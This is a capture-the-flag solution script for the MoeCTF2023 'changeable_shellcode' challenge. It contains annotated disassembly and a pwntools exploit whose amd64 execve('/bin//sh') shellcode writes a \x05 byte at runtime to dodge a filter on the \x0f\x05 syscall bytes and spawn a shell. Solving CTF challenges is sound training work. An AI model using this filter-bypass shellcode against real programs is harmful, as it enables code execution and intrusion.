"""MoeCTF2023 changeable_shellcode
  read(0, s, 0x28uLL); 
  filter((char *)s, 40);                ; 这里过滤不能有连续的 \x0f\x05
.text:13C1 mov     rax, 114514000h      ; 这一段是复制输入到 114514000h, rax=114514000h
.text:13CB mov     rcx, [rbp+s]
.text:13CF mov     rbx, [rbp+var_38]
.text:13D3 mov     [rax], rcx
.text:13D6 mov     [rax+8], rbx
.text:13DA mov     rcx, [rbp+var_30]
.text:13DE mov     rbx, [rbp+var_28]
.text:13E2 mov     [rax+10h], rcx
.text:13E6 mov     [rax+18h], rbx
.text:13EA mov     rdx, [rbp+var_20]
.text:13EE mov     [rax+20h], rdx
.text:13F2 mov     rdx, 114514000h
"""
from pwn import *

context.arch = "amd64"
p = process('./shellcode')
# p = remote('localhost',37853)

# 第一条语句是为了在\x0f后面添加\x05形成syscall
shellcode = '''
mov byte ptr[rax+33], 5
push 0
mov rax, 0x68732f2f6e69622f
push rax
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 59
'''
print(len(asm(shellcode))) 
# 32长度 0x114514000 - 0x11451401F
# mov byte ptr[rax+33], 5 => 0x114514021 = \x05, 0x114514020 补一个\x0f 即可满足 \x0f\x05 为 syscall
p.sendline(asm(shellcode) + b'\x0f')

p.interactive()
